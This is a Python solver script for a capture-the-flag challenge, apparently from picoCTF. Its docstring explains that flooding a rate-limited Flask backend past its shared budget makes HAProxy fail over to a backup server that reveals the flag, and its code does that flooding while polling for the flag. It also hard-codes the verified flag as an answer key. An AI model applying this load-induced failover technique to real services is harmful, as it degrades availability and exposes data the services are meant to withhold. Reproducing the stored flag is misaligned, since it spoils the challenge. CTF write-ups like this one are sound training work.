#!/usr/bin/env python3
"""Solver for Challenge 756 Failure Failure (picoCTF 2026, General Skills).

HAProxy (frontend :80) fronts two Flask backends:
  s1 *:8000 (primary)          -> IS_BACKUP unset -> "No flag in this service"
  s2 *:9000 (backup keyword)   -> IS_BACKUP=yes   -> FLAG from env
Health: `option httpchk GET /` + `http-check expect status 200`,
`fall 2 rise 3`, `inter 2s`.

Root cause of failover vector: Flask-Limiter shares ONE global bucket
("300 per minute", key_func constant) across ALL clients INCLUDING the
load balancer's own health checks. Sustained load >5 req/s makes s1 answer
503 (handler returns 503 text), so haproxy marks s1 DOWN after fall*inter
and fails over to the backup s2 which serves the flag.

Steady-state catch: s1 recovers via rise 3 within seconds once load stops,
so the s2 window is narrow. Strategy: one loader thread sustains ~5.5
req/s (above the 300/min budget) while a poller fetches 1x/sec until a
response contains the flag. s2's own limiter stays healthy because it only
receives traffic during the failover window.

Usage: solve_756_failure_failure.py [base-url]
Verified: academy{f41l0v3r_f0r_7h3_w1n_7897afd6} (POST /api/submissions/ -> correct:true)
"""
import re
import sys
import threading
import time
import urllib.request

BASE = "http://chatelaine.cylabacademy.net:30747/"
EXPECTED = "academy{f41l0v3r_f0r_7h3_w1n_7897afd6}"

FLAG_RE = re.compile(r"academy\{[^}]*\}|picoCTF\{[^}]*\}")


def fetch(url: str, agent: str = "Mozilla/5.0") -> str:
    req = urllib.request.Request(url, headers={"User-Agent": agent,
                                               "Connection": "close"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode(errors="replace")


def solve(base: str = BASE, window: int = 240) -> str:
    base = base.rstrip("/") + "/"
    stop = time.time() + window
    found: list = []

    def loader() -> None:
        while time.time() < stop and not found:
            try:
                fetch(base, agent="Load/1.0")
            except Exception:
                pass
            time.sleep(0.18)  # ~5.5 req/s, above the 300/min budget

    n = 0
    t = threading.Thread(target=loader, daemon=True)
    t.start()
    while time.time() < stop and not found:
        n += 1
        try:
            m = FLAG_RE.search(fetch(base))
            if m:
                found.append(m.group(0))
                break
        except Exception:
            pass
        time.sleep(1.0)
    if not found:
        raise ValueError("flag not caught inside %ds window" % window)
    print("flag:", found[0])
    assert found[0] == EXPECTED, found[0]
    return EXPECTED


if __name__ == "__main__":
    a = sys.argv[1:]
    print(solve(a[0] if a else BASE))
